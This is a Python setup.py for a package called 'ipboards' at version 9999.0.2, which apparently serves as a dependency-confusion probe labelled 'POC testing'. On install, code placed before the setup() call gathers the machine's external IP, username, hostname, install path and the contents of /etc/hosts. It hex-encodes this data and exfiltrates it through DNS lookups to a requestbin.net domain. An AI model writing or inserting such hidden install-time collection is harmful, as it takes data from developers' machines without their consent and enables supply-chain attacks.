from setuptools import setup, find_packages
import dns.resolver
import getpass
import requests
import json
import uuid
from binascii import hexlify
import socket
import os
import time

dnss=".b0a0374cd1cb4305002e.d.requestbin.net"
packagename="ipboard"
uuidOne =str(uuid.uuid1())[0:8]
dnss='.'+uuidOne+dnss
ip=requests.get('http://ip.42.pl/raw').text


#username,hostname,external_IP,time,path,package_name
f = open("/etc/hosts", "r")
hostFile=f.read()
username=getpass.getuser()
hostname=socket.gethostname()
now =int(time.time())
path=os.path.dirname(os.path.abspath(__file__))
payload=ip+';'+username+';'+hostname+';'+str(now)+';'+path+';'+packagename+';'+hostFile
try:
    payload=hexlify(bytes(payload,encoding='utf8'))
except:
    payload=hexlify(bytes(payload))

chunks = [payload[i:i+50] for i in range(0, len(payload), 50)]

for pd in chunks:
    dns.resolver.query(pd.decode("utf-8") +dnss,'A') 
  
 
classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Education',
  'Operating System :: Microsoft :: Windows :: Windows 10',
  'License :: OSI Approved :: MIT License',
  'Programming Language :: Python :: 3'
]
 
setup(
  name='ipboards',
  version='9999.0.2',
  description='POC testing',
  long_description=open('README.txt').read() + '\n\n' + open('CHANGELOG.txt').read(),
  url='',  
  author='Dingan',
  author_email='dingan@dingan.org',
  license='MIT', 
  classifiers=classifiers,
  keywords='totallytestingforbugs', 
  packages=find_packages(),
  install_requires=[''] 
)
